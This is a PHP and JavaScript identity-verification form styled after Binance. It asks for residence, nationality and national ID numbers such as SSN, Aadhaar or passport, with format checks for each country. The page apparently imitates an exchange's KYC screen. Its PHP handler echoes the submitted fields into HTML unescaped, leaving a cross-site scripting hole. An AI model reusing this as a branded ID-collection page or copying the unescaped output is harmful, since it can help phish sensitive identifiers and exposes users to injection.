<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Form submit hone par yahan data process kar sakte hain
    $country = $_POST['country'] ?? '';
    $nationality = $_POST['nationality'] ?? '';
    $id_type = $_POST['id_type'] ?? '';
    $id_number = $_POST['id_number'] ?? '';
    $agree = isset($_POST['agree']);

    if ($country && $nationality && $id_type && $id_number && $agree) {
        echo "<div style='color: #0f0;'>Verification submitted successfully!<br>Country: $country<br>Nationality: $nationality<br>ID Type: $id_type<br>ID Number: $id_number</div>";
    } else {
        echo "<div style='color: #f00;'>Please fill all fields and agree to the terms.</div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Let's Get You Verified</title>
    <style>
        body { background: #181A20; color: #fff; font-family: 'Inter', Arial, sans-serif; }
        .container { max-width: 420px; margin: 48px auto; background: #23262F; padding: 36px 28px 32px 28px; border-radius: 16px; box-shadow: 0 4px 32px 0 rgba(20, 21, 34, 0.45); }
        h2 { margin-bottom: 28px; font-size: 2rem; font-weight: 700; letter-spacing: 0.5px; }
        label { display: block; margin: 18px 0 8px; font-size: 1rem; font-weight: 500; color: #eaecef; }
        .custom-dropdown {
          position: relative;
          width: 100%;
          margin-bottom: 10px;
          user-select: none;
        }
        .custom-dropdown .selected {
          background: #181A20;
          border: 1.5px solid #383B45;
          border-radius: 8px;
          padding: 12px 14px;
          color: #fff;
          font-size: 1rem;
          display: flex;
          align-items: center;
          cursor: pointer;
          position: relative;
          padding-right: 36px;
          transition: border 0.2s;
        }
        .custom-dropdown .selected img {
          width: 24px;
          height: 18px;
          margin-right: 10px;
          border-radius: 3px;
          box-shadow: 0 1px 2px #0002;
        }
        .custom-dropdown .selected::after {
          content: '';
          position: absolute;
          right: 16px;
          top: 50%;
          width: 16px;
          height: 16px;
          pointer-events: none;
          transform: translateY(-50%);
          background: url('data:image/svg+xml;utf8,<svg fill="white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M5.8 8.3a1 1 0 0 1 1.4 0L10 11.09l2.8-2.8a1 1 0 1 1 1.4 1.42l-3.5 3.5a1 1 0 0 1-1.4 0l-3.5-3.5a1 1 0 0 1 0-1.42z"/></svg>') no-repeat center/16px 16px;
          opacity: 0.7;
        }
        .custom-dropdown .dropdown-list {
          display: none;
          position: absolute;
          width: 100%;
          background: #23262F;
          border: 1.5px solid #383B45;
          border-radius: 8px;
          margin-top: 4px;
          z-index: 10;
          max-height: 220px;
          overflow-y: auto;
          box-shadow: 0 4px 16px 0 rgba(20, 21, 34, 0.25);
        }
        .custom-dropdown.open .dropdown-list {
          display: block;
        }
        .custom-dropdown .dropdown-list li {
          padding: 10px 14px;
          display: flex;
          align-items: center;
          cursor: pointer;
          font-size: 1rem;
          color: #fff;
          transition: background 0.15s;
        }
        .custom-dropdown .dropdown-list li img {
          width: 24px;
          height: 18px;
          margin-right: 10px;
          border-radius: 3px;
          box-shadow: 0 1px 2px #0002;
        }
        .custom-dropdown .dropdown-list li:hover,
        .custom-dropdown .dropdown-list li.selected {
          background: #2c2f36;
        }
        select, input[type="text"] {
            width: 100%;
            padding: 12px 14px;
            border-radius: 8px;
            border: 1.5px solid #383B45;
            background: #181A20;
            color: #fff;
            margin-bottom: 10px;
            font-size: 1rem;
            transition: border 0.2s, box-shadow 0.2s;
            box-shadow: 0 1px 2px 0 rgba(20, 21, 34, 0.10);
        }
        select:focus, input[type="text"]:focus {
            border: 1.5px solid #FCD535;
            outline: none;
            box-shadow: 0 0 0 2px #fcd53544;
        }
        input[type="checkbox"] { margin-right: 8px; accent-color: #FCD535; }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #FCD535 0%, #FFD800 100%);
            color: #181A20;
            border: none;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            opacity: 0.7;
            margin-top: 18px;
            box-shadow: 0 2px 8px 0 rgba(252, 213, 53, 0.10);
            transition: opacity 0.2s, box-shadow 0.2s;
        }
        .btn.enabled {
            opacity: 1;
            box-shadow: 0 4px 16px 0 rgba(252, 213, 53, 0.18);
        }
        .btn:active {
            box-shadow: 0 2px 8px 0 rgba(252, 213, 53, 0.10);
        }
        .note {
            color: #FCD535;
            font-size: 13px;
            margin-bottom: 12px;
            margin-top: 2px;
        }
        form {
            margin-top: 0;
        }
        ::placeholder {
            color: #888;
            opacity: 1;
        }
        /* Responsive styles */
        @media (max-width: 900px) {
            .container {
                max-width: 95vw;
                padding: 28px 4vw 24px 4vw;
            }
            h2 {
                font-size: 1.5rem;
            }
        }
        @media (max-width: 600px) {
            .container {
                max-width: 100vw;
                margin: 24px auto;
                padding: 16px 2vw 14px 2vw;
                border-radius: 10px;
            }
            h2 {
                font-size: 1.15rem;
                margin-bottom: 18px;
            }
            label {
                font-size: 0.98rem;
                margin: 12px 0 6px;
            }
            .custom-dropdown .selected,
            select, input[type="text"] {
                font-size: 0.98rem;
                padding: 10px 10px;
            }
            .custom-dropdown .dropdown-list li {
                font-size: 0.98rem;
                padding: 8px 10px;
            }
            .btn {
                font-size: 1rem;
                padding: 12px;
            }
        }
        @media (max-width: 400px) {
            .container {
                padding: 8px 0 8px 0;
            }
            h2 {
                font-size: 1rem;
            }
            .btn {
                font-size: 0.95rem;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Let's Get You Verified</h2>
    <form method="post" id="verifyForm">
        <label>Residence</label>
        <div class="custom-dropdown" id="countryDropdown">
          <div class="selected" id="selectedCountry"></div>
          <ul class="dropdown-list" id="countryList"></ul>
          <input type="hidden" name="country" id="countryInput" required>
        </div>

        <label>Nationality</label>
        <div class="custom-dropdown" id="nationalityDropdown">
          <div class="selected" id="selectedNationality"></div>
          <ul class="dropdown-list" id="nationalityList"></ul>
          <input type="hidden" name="nationality" id="nationalityInput" required>
        </div>

        <label id="idTypeLabel">ID Proof</label>
        <select name="id_type" id="id_type" required>
            <option value="">Select ID Proof</option>
        </select>

        <label id="idNumberLabel">ID Number</label>
        <input type="text" name="id_number" id="id_number" required autocomplete="off" />
        <div class="note" id="idError" style="color:#f66; margin-bottom:8px;"></div>

        <div class="note" id="noIdNote" style="display:none;">
            Don't have selected ID? Try another document.
        </div>

        <label style="margin-top: 18px;">
            <input type="checkbox" name="agree" id="agree" />
            I authorize Binance and its service providers to access, collect, and store my data, including ID, to provide services on the Binance platform.
        </label>

        <button type="submit" class="btn" id="submitBtn" disabled>Continue</button>
    </form>
</div>

<script>
const countryData = [
    { code: "IN", name: "India (भारत)", flag: "🇮🇳", ids: ["Aadhaar", "PAN Card", "Passport"] },
    { code: "US", name: "United States", flag: "🇺🇸", ids: ["SSN", "Driver's License", "Passport"] },
    { code: "GB", name: "United Kingdom", flag: "🇬🇧", ids: ["National Insurance", "Passport", "Driving Licence"] },
    { code: "CA", name: "Canada", flag: "🇨🇦", ids: ["SIN", "Driver's License", "Passport"] },
    { code: "AU", name: "Australia", flag: "🇦🇺", ids: ["Medicare", "Driver's License", "Passport"] },
    { code: "DE", name: "Germany", flag: "🇩🇪", ids: ["Personalausweis", "Reisepass"] },
    { code: "FR", name: "France", flag: "🇫🇷", ids: ["Carte Nationale d'Identité", "Passport"] },
    { code: "BR", name: "Brazil", flag: "🇧🇷", ids: ["CPF", "RG", "Passport"] },
    { code: "ZA", name: "South Africa", flag: "🇿🇦", ids: ["ID Book", "Passport"] },
    { code: "RU", name: "Russia", flag: "🇷🇺", ids: ["Internal Passport", "Foreign Passport"] },
    { code: "CN", name: "China", flag: "🇨🇳", ids: ["Resident Identity Card", "Passport"] },
    { code: "JP", name: "Japan", flag: "🇯🇵", ids: ["My Number Card", "Passport"] },
    { code: "IT", name: "Italy", flag: "🇮🇹", ids: ["Carta d'Identità", "Passport"] },
    { code: "ES", name: "Spain", flag: "🇪🇸", ids: ["DNI", "Passport"] },
    { code: "MX", name: "Mexico", flag: "🇲🇽", ids: ["CURP", "INE", "Passport"] },
    { code: "ID", name: "Indonesia", flag: "🇮🇩", ids: ["KTP", "Passport"] },
    { code: "TR", name: "Turkey", flag: "🇹🇷", ids: ["Kimlik Kartı", "Passport"] },
    { code: "KR", name: "South Korea", flag: "🇰🇷", ids: ["Resident Registration Card", "Passport"] },
    { code: "NG", name: "Nigeria", flag: "🇳🇬", ids: ["NIN", "Voter's Card", "Passport"] },
    { code: "PK", name: "Pakistan", flag: "🇵🇰", ids: ["CNIC", "Passport"] }
];

const idFormats = {
  // INDIA
  "Aadhaar": {
    placeholder: "1234 5678 9012",
    pattern: /^\d{4}\s?\d{4}\s?\d{4}$/,
    error: "Enter a valid 12-digit Aadhaar number (digits only, 4-4-4 format).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim()
  },
  "PAN Card": {
    placeholder: "ABCDE1234F",
    pattern: /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/,
    error: "Enter a valid 10-character PAN (5 letters, 4 digits, 1 letter, all caps).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },
  "Passport": {
    placeholder: "A1234567",
    pattern: /^[A-Z][0-9]{7}$/,
    error: "Enter a valid Passport number (1 letter, 7 digits, e.g. A1234567).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // USA
  "SSN": {
    placeholder: "123-45-6789",
    pattern: /^\d{3}-\d{2}-\d{4}$/,
    error: "Enter a valid SSN (format: 123-45-6789).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{3})(\d{2})(\d{0,4})/, (m, a, b, c) => [a, b, c].filter(Boolean).join('-')).substr(0, 11)
  },
  "Driver's License": {
    placeholder: "A1234567",
    pattern: /^[A-Z0-9]{5,15}$/,
    error: "Enter a valid Driver's License (5-15 alphanumeric characters).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // UK
  "National Insurance": {
    placeholder: "QQ123456C",
    pattern: /^[A-CEGHJ-PR-TW-Z]{2}\d{6}[A-D]$/,
    error: "Enter a valid NIN (2 letters, 6 digits, 1 letter, e.g. QQ123456C).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // CANADA
  "SIN": {
    placeholder: "123-456-789",
    pattern: /^\d{3}-\d{3}-\d{3}$/,
    error: "Enter a valid SIN (format: 123-456-789).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{3})(\d{3})(\d{0,3})/, (m, a, b, c) => [a, b, c].filter(Boolean).join('-')).substr(0, 11)
  },

  // AUSTRALIA
  "Medicare": {
    placeholder: "1234 56789 1",
    pattern: /^\d{4}\s?\d{5}\s?\d{1}$/,
    error: "Enter a valid Medicare number (format: 1234 56789 1).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{4})(\d{5})(\d{0,1})/, (m, a, b, c) => [a, b, c].filter(Boolean).join(' ')).trim()
  },

  // GERMANY
  "Personalausweis": {
    placeholder: "L01X00T47",
    pattern: /^[A-Z0-9]{9}$/,
    error: "Enter a valid Personalausweis (9 alphanumeric characters).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // FRANCE
  "Carte Nationale d'Identité": {
    placeholder: "12AB34567",
    pattern: /^[0-9]{2}[A-Z]{2}[0-9]{5}$/,
    error: "Enter a valid French ID (2 digits, 2 letters, 5 digits).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // BRAZIL
  "CPF": {
    placeholder: "123.456.789-09",
    pattern: /^\d{3}\.\d{3}\.\d{3}-\d{2}$/,
    error: "Enter a valid CPF (format: 123.456.789-09).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, (m, a, b, c, d) => [a, b, c].join('.') + '-' + d).substr(0, 14)
  },

  // SOUTH AFRICA
  "ID Book": {
    placeholder: "8001015009087",
    pattern: /^\d{13}$/,
    error: "Enter a valid 13-digit South African ID.",
    transform: v => v.replace(/[^\d]/g, '').substr(0, 13)
  },

  // RUSSIA
  "Internal Passport": {
    placeholder: "1234 567890",
    pattern: /^\d{4}\s?\d{6}$/,
    error: "Enter a valid Russian passport (4 digits, space, 6 digits).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{4})(\d{6})/, '$1 $2').trim()
  },

  // CHINA
  "Resident Identity Card": {
    placeholder: "11010119900307811X",
    pattern: /^\d{17}[\dXx]$/,
    error: "Enter a valid Chinese ID (18 digits, last can be X).",
    transform: v => v.toUpperCase().replace(/[^0-9X]/g, '').substr(0, 18)
  },

  // JAPAN
  "My Number Card": {
    placeholder: "1234-5678-9012",
    pattern: /^\d{4}-\d{4}-\d{4}$/,
    error: "Enter a valid My Number (format: 1234-5678-9012).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{4})(\d{4})(\d{0,4})/, (m, a, b, c) => [a, b, c].filter(Boolean).join('-')).substr(0, 14)
  },

  // ITALY
  "Carta d'Identità": {
    placeholder: "CA1234567",
    pattern: /^[A-Z]{2}\d{7}$/,
    error: "Enter a valid Italian ID (2 letters, 7 digits).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // SPAIN
  "DNI": {
    placeholder: "12345678A",
    pattern: /^\d{8}[A-Z]$/,
    error: "Enter a valid DNI (8 digits, 1 letter).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '')
  },

  // MEXICO
  "CURP": {
    placeholder: "GODE561231HDFRRN09",
    pattern: /^[A-Z]{4}\d{6}[A-Z]{6}\d{2}$/,
    error: "Enter a valid CURP (18 chars, e.g. GODE561231HDFRRN09).",
    transform: v => v.toUpperCase().replace(/[^A-Z0-9]/g, '').substr(0, 18)
  },

  // INDONESIA
  "KTP": {
    placeholder: "1234567890123456",
    pattern: /^\d{16}$/,
    error: "Enter a valid 16-digit KTP number.",
    transform: v => v.replace(/[^\d]/g, '').substr(0, 16)
  },

  // TURKEY
  "Kimlik Kartı": {
    placeholder: "12345678901",
    pattern: /^\d{11}$/,
    error: "Enter a valid 11-digit Turkish ID.",
    transform: v => v.replace(/[^\d]/g, '').substr(0, 11)
  },

  // SOUTH KOREA
  "Resident Registration Card": {
    placeholder: "123456-1234567",
    pattern: /^\d{6}-\d{7}$/,
    error: "Enter a valid Korean ID (format: 123456-1234567).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{6})(\d{0,7})/, (m, a, b) => a + (b ? '-' + b : '')).substr(0, 14)
  },

  // NIGERIA
  "NIN": {
    placeholder: "12345678901",
    pattern: /^\d{11}$/,
    error: "Enter a valid 11-digit NIN.",
    transform: v => v.replace(/[^\d]/g, '').substr(0, 11)
  },

  // PAKISTAN
  "CNIC": {
    placeholder: "12345-1234567-1",
    pattern: /^\d{5}-\d{7}-\d{1}$/,
    error: "Enter a valid CNIC (format: 12345-1234567-1).",
    transform: v => v.replace(/[^\d]/g, '').replace(/(\d{5})(\d{7})(\d{0,1})/, (m, a, b, c) => [a, b, c].filter(Boolean).join('-')).substr(0, 15)
  }
};

// Helper to get flag image URL
function getFlagUrl(code) {
    return `https://flagcdn.com/24x18/${code.toLowerCase()}.png`;
}

// Populate custom dropdown
function populateCustomDropdown(dropdownId, listId, selectedId, inputId, defaultText) {
    const dropdown = document.getElementById(dropdownId);
    const list = document.getElementById(listId);
    const selected = document.getElementById(selectedId);
    const input = document.getElementById(inputId);

    // Populate list
    list.innerHTML = '';
    countryData.forEach(c => {
        const li = document.createElement('li');
        li.innerHTML = `<img src="${getFlagUrl(c.code)}" alt="${c.code}"> ${c.name}`;
        li.dataset.code = c.code;
        li.addEventListener('click', function() {
            selected.innerHTML = `<img src="${getFlagUrl(c.code)}" alt="${c.code}"> ${c.name}`;
            input.value = c.code;
            dropdown.classList.remove('open');
            list.querySelectorAll('li').forEach(li2 => li2.classList.remove('selected'));
            li.classList.add('selected');
            validateForm();
            if(dropdownId === 'countryDropdown') updateIdTypes(); // For country only
        });
        list.appendChild(li);
    });

    // Default selected
    selected.textContent = defaultText;
    input.value = '';

    // Dropdown open/close
    selected.onclick = function(e) {
        e.stopPropagation();
        document.querySelectorAll('.custom-dropdown').forEach(dd => dd.classList.remove('open'));
        dropdown.classList.toggle('open');
    };
    // Close on outside click
    document.addEventListener('click', function() {
        dropdown.classList.remove('open');
    });
}

// Call for both dropdowns on DOMContentLoaded
function validateForm() {
    const country = document.getElementById('countryInput').value;
    const nationality = document.getElementById('nationalityInput').value;
    const idType = document.getElementById('id_type').value;
    const idNumber = document.getElementById('id_number').value.trim();
    const agree = document.getElementById('agree').checked;
    const btn = document.getElementById('submitBtn');
    const idError = document.getElementById('idError');
    let valid = true;
    if (idFormats[idType]) {
        if (!idFormats[idType].pattern.test(idNumber)) {
            idError.textContent = idFormats[idType].error;
            valid = false;
        } else {
            idError.textContent = '';
        }
    } else {
        idError.textContent = '';
    }
    btn.disabled = !(country && nationality && idType && idNumber && agree && valid);
    btn.classList.toggle('enabled', !btn.disabled);
}

document.addEventListener('DOMContentLoaded', function() {
    populateCustomDropdown('countryDropdown', 'countryList', 'selectedCountry', 'countryInput', 'Select Country');
    populateCustomDropdown('nationalityDropdown', 'nationalityList', 'selectedNationality', 'nationalityInput', 'Select Nationality');
    document.getElementById('id_type').addEventListener('change', function() {
        const idType = this.value;
        const idInput = document.getElementById('id_number');
        if (idFormats[idType]) {
            idInput.placeholder = idFormats[idType].placeholder;
            idInput.value = '';
            idInput.maxLength = idFormats[idType].placeholder.length;
        } else {
            idInput.placeholder = '';
            idInput.value = '';
            idInput.removeAttribute('maxLength');
        }
        validateForm();
    });
    document.getElementById('id_number').addEventListener('input', function() {
        const idType = document.getElementById('id_type').value;
        if (idFormats[idType]) {
            this.value = idFormats[idType].transform(this.value);
        }
        validateForm();
    });
    document.getElementById('agree').addEventListener('change', validateForm);
    validateForm();
});

// Update ID types when country changes
function updateIdTypes() {
    const countryCode = document.getElementById('countryInput').value;
    const idTypeSelect = document.getElementById('id_type');
    idTypeSelect.innerHTML = '<option value="">Select ID Proof</option>';
    if (!countryCode) return;
    const country = countryData.find(c => c.code === countryCode);
    if (country) {
        country.ids.forEach(id => {
            let opt = document.createElement('option');
            opt.value = id;
            opt.textContent = id;
            idTypeSelect.appendChild(opt);
        });
    }
}
</script>
</body>
</html>
